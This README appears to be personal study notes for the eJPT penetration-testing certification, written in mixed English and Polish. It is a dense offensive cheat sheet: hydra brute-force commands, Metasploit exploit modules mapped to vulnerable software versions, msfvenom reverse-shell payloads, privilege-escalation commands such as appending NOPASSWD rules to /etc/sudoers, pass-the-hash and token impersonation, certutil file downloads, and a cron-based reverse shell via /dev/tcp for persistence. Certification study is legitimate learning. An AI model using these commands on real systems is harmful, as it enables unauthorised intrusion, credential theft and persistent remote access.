# eJPT-Study-Notes
My sheet sheet, which I used during my eJPT exam. I've got 91% :)

# The cheat sheet
PIVOTING: 
jak robisz autoroute to daj na adres ip maszyny, do której się chcesz dostać, ewentualnie na ip widocznego na interfejsie pierwszej maszyny


Lists:

a)users:

/usr/share/metasploit-framework/data/wordlists/common_users.txt

/data/wordlists/unix_users.txt

/usr/share/metasploit-framework/data/wordlists/namelist.txt

/usr/share/wordlists/metasploit/unix_users.txt

root

vagrant

search smtp_enum # pobranie userów po SMTP


b)passwords:

/usr/share/metasploit-framework/data/wordlists/unix_passwords.txt

/usr/share/wordlists/metasploit/unix_passwords.txt

/usr/share/metasploit-framework/data/wordlists/common_passwords.txt

/usr/share/wordlists/rockyou.txt.gz


c)for cracking:

auxiliary/scanner/http/http_login

http/dir_scanner

auxiliary/scanner/winrm/winrm_login


d)files, dirs:

/usr/share/metasploit-framework/data/wordlists/directory.txt

hydra fast commands:

hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ip ftp

hydra -l administrator -P /usr/share/wordlists/metasploit/unix_users.txt ip ssh

hydra -l administrator -P /usr/share/wordlists/metasploit/unix_passwords.txt demo.ine.local smb



vulnerabilities:

* jak nie mas pomysłu to są 3 opcje: wpisujesz wersje w gogle i słowa exploit lub cve | searchsploit wersja | moduł metasplota suggester czy jakoś tak
  
* jak masz exploita na daną wersje, ale nie działa to niekoniecznie robisz coś źle, być może został dany exploit załatany
  
linux - vsftpd v 2.3.4  -  exploit/unix/ftp/vsftpd_234_backdoor

linux - proftpd 1.3.3c  -  proftpd_133c_backdoor

linux - Haraka SMTP v2.8.9 i 2.8.8  -  exploit/linux/smtp/haraka

linux - libssh v0.6.0-0.8.0 i 0.8.3  -  auxiliary/scanner/ssh/libssh_auth_bypass

linux - Samba v3.5.0 / 3.0.20 (ogólnie smbd 3.5.0 to 4.4.14, 4.5.10, and 4.6.4)  -  exploit/……/is_known_pipename

linux - samba 3.0.20  -  exploit/multi/samba/usermap_script

windows - Apache Tomcat v8.5.19  -  exploit/multi/http/tomcat_jsp_upload_bypass

windows - rejetto HttpFileServer 2.3 -  exploit/windows/http/rejetto_hfs_exec

xoda web service  -  exploit/unix/webapp/xoda_file_upload

linux priv esc  -  chkrootkit  0.49  -  exploit/unix/local/chkrootkit  (whereis chkrootkit)

windows  -  badblue 2.7  -  exploit/windows/http/badblue_passthru

Windows 2008 and 2008R2 - search eternalblue  -  ms17_010_eterenalblue (auxiliary/scanner/smb/smb_ms17_010 detection)

PHP 5.4.2 versions below - CGI plik - shellshock  -  exploit/multi/http/php_cgi_arg_injection | apache_mod_chi_bash_env_exec 

/phpinfo.php - 5.2.4ubuntu5.10 lub CGI | exploit/multi/http/php_cgi_arg_injection

WebDAV | davtest -url http://10.0.17.27/webdav | davtest -auth bob:password_123321 -url http://10.0.17.27/webdav | exploit/windows/iis/iis_webdav_upload_asp

ProcessMaker HTTP -  exploit/multi/http/process_maker_exec

5985 port | WinRM - winrm_script_exec | auxiliary/scanner/winrm/winrm_login



webshells, reverse shells:
/usr/share/webshells/php/php-backdoor.php
msfvenom -p windows/shell/reverse_tcp LHOST=ip LPORT=1234 -f asp > shell.aspx
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/asp/webshell.asp
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.3 LPORT=4444 -f exe > 'backdoor.exe
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=ip LPORT=1234 -f exe > payload.exe


usefull:
post/multi/manage/shell_to_meterpreter
TCP port 5985 5986 (HTTPS) wsman (słowo klucz) - Windows Remote   Management Protocol - auxiliary/scanner/winrm/winrm_login
mimikatz = KIWI | meterpreter>load kiwi
testowanie dziwnych portów (np. takich ze znakiem zapytania?) - nc -nv ip <port>
Microsoft IIS = asp lub aspx
Apache i Linux = php
exploit/windows/misc/hta_server
https://github.com/411Hall/JAWS - windows wnumeration
https://github.com/rebootuser/LinEnum - linux enumeration
auxiliary/analyze/crack_windows
post/linux/gather/hashdump
auxiliary/analyze/crack_linux
auxiliary/scanner/rdp/rdp_scanner - RDP może być na innym niż domyślnym porcie
nmap --script http-shellshock --script-args “http-shellshock.uri=/gettime.cgi” 192.242.220.3 (JAK JEST CGI FILE)
exploit/windows/smb/psexec
post/linux/gather/phpmyadmin_credsteal # może znaleźć hasło do roota
https://github.com/hfiref0x/UACME


interesting paths:
/wamp/www/wordpress/wp-config.php
C:\wamp\alias\phpmyadmin.conf
/usr/share/windows-resources/mimikatz/x64/mimikatz.exe


privilege esc:

linux - ps aux - szukasz procesu chkrootkit

linux - exploit/unix/local/chkrootkit

linux - find / -not -type l -perm -o+w | it will find world writable files

linux - etc/shadow jak można edytować to możemy usera dodać

linux -  find / -user root -perm -4000 -exec ls -ldb {} \ | poszukuje SEUID programs

linux - sudo -l | sprawdź do czego masz uprawnienia sudo bo czasem jak masz np. do nano albo cat to możesz wyświetlić /etc/shadow, a znowu jak masz do vi to możesz z tego poziomu zrobić basha, tak samo z man: otwierasz sudo man, potem !/bin/bash

linux -  grep -nri “/tmp/message” /usr | poszukiwanie plików z daną zawartością, w tym przypadku zapisujących do wskazanej ścieżki

linux - printf '#! /bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh

linux - plik welcome s ustawionym SUID, "strings welcome" wskazuje wykonanie pliku greetings z poziomu pliku welcome, rm greetings, cp /bin/bash greetings, ./welcome

getsystem

linux - zawsze warto sprawdzić pliki w katalogu domowym oraz w /tmp

linux - generalnie jak jest crontab i privilege esc z tym związane, to szukasz pliku (polecenie stat), który będzie edyowany co minute, jak znajdziesz plik to szukasz pliku, który w swoim kodzie ma edycję pliku (polecenie grep)

windows - exploit/windows/local/bypassuac_injection

windows - Source: https://github.com/itm4n/PrivescCheck  | PowerShell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck "

windows - runas.exe /user:administrator cmd

windows - psexec.py Administrator@target_ip

windows - exploit/windows/smb/psexec

windows - /root/Desktop/tools/UACME/Akagi64.exe | Akagi64.exe 23 C:\Users\admin\AppData\Local\Temp\backdoor.exe

windows - Source: https://github.com/PowerShellMafia/PowerSploit

windows - load incognito | list_tokens -u | impersonate_token "ATTACKDEFENSE\Administrator"

windows - crackmapexec smb ip -u Administrator -H "NTLM hash" # zalogowanie się na admina używając hasza NTLM




transfering files:

certutil -urlcache -f http://10.10.3.2/nc.exe nc.exe

python -m SimpleHTTPServer 80

python3 -m http.server 80 

nc.exe -nvlp 1234 > test.txt

nc -nv ip port < test.txt

wget http://ip/php-backdoor.php



persistence:

windows - getgui

*windows - exploit/windows/local/persistence_service

linux - echo "* * * * * cd /home/student/ && python -m SimpleHTTPServer" > cron; crontab -i cron

linux - scp student@192.37.104.3:~/.ssh/id_rsa , a potem ssh -i id_rsa student@192.37.104.3

*linux - echo "* * * * * /bin/bash -c 'bash -i >& /dev/tcp/ip_kali/1234 0>&1'" > cron (TO JEST NAJLEPSZE)


fast login:

scanner/ssh/ssh_login

mysql -h ip -u root # jak root jest bez hasła

